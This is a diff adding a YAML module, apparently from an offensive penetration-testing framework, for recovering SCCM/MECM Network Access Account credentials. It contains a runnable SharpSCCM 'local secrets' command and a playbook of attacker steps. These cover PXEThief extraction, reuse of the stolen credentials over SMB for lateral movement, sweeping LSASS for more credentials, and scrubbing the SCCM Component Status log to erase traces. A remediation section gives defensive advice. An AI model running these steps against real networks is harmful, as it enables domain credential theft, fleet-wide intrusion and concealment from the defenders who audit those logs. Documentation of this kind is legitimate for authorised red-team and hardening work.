@@ -1,0 +1,77 @@
+# SCCM/MECM Network Access Account (NAA) credential recovery
+#
+# SCCM's Network Access Account credentials are pushed to every
+# managed client in the DataTransferService policy — used for
+# OS-deployment scenarios where a machine boots via PXE + needs
+# a domain account to fetch install images. In older SCCM
+# versions the NAA is stored in the client-side policy in
+# effectively-plaintext form (DPAPI-encrypted but with a
+# machine-scoped key any local admin can unlock).
+#
+# From any SCCM-enrolled client (compromised via any local
+# admin path), SharpSCCM's `local secrets` command dumps the
+# NAA. Alternatively, PXEThief attacks the PXE boot flow
+# without needing a client at all — sends a targeted PXE
+# request, extracts the NAA from the returned WIM.
+#
+# NAAs are typically domain accounts with broad read across
+# workstation OUs, sometimes with wider rights via GPO
+# assignment. Recovery = one credential jackpot for every
+# SCCM-managed environment.
+technique: T1552.001
+name: SCCM Network Access Account credential recovery
+tactic: [credential-access]
+platform: [windows]
+key: 'sccm:naa-recovery'
+family: sccm
+ranking:
+  exploitability: high
+  safety: read-only               # dump-only; no state change
+  detection: moderate              # unusual PXE request OR SharpSCCM client-side execution
+detect:
+  version_range:
+    services.sccm: ">=1.0"
+execute:
+  command: |-
+    SharpSCCM.exe local secrets 2>&1 | grep -iE 'NAA|network access' || echo "no local SCCM client — see playbook for PXEThief path"
+verify:
+  success: "NetworkAccessUsername"
+cleanup:
+  command: ""
+report:
+  vector_type: sccm_naa_recovery
+  evidence: "recovered NAA {{account}}"
+  description: >
+    SCCM/MECM Network Access Account credentials pushed to
+    managed clients in the DataTransferService policy are
+    recoverable via SharpSCCM local secrets (from any owned
+    SCCM client) or PXEThief (from the network without a
+    client). NAAs are typically domain accounts with broad
+    workstation-OU reads + sometimes wider rights via GPO —
+    a single NAA recovery often unlocks lateral movement
+    across the entire managed fleet.
+  remediation: >
+    Rotate the NAA immediately + audit for the last 90 days
+    of NAA authentications in Windows security event log
+    (event 4624 with the NAA's SID) — treat any unexpected
+    source IP as compromise. Migrate to Enhanced HTTP or
+    PKI certificate-based client-server auth (SCCM 2103+)
+    which retires the NAA. Restrict SCCM management console
+    access to named admins; audit the Component Status log
+    for unexpected SharpSCCM-shape queries.
+  refs: [T1552.001, SharpSCCM, PXEThief]
+playbook:
+  summary: >
+    SharpSCCM local secrets (from an owned SCCM client) OR
+    PXEThief (from the network) → NAA cred jackpot →
+    lateral movement across managed fleet.
+  place: 'attacker-side (SharpSCCM by Chris Thompson, PXEThief by MWR)'
+  steps:
+    - "check target is SCCM-managed: `Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\CCM\\Setup` shows install path if agent present"
+    - "run SharpSCCM as any local user (SYSTEM not required): `SharpSCCM.exe local secrets`"
+    - "capture NAA + client push cred blocks from output"
+    - "alternative — PXEThief from the network: `python3 PXEThief.py -i <MP-ip>` sends a targeted PXE request + extracts NAA from the WIM"
+    - "use the NAA: `nxc smb <workstation> -u <NAA-user> -p <NAA-pass>` — expect broad local admin on managed clients"
+    - "loot: with NAA + a foothold on multiple clients, sweep LSASS for other credentials via fieldkit's spray+loot loop"
+    - "CLEANUP: the local secrets query is auditable in the SCCM Component Status log; a queue-flush post-eng scrubs the entry"
+  restore: ""
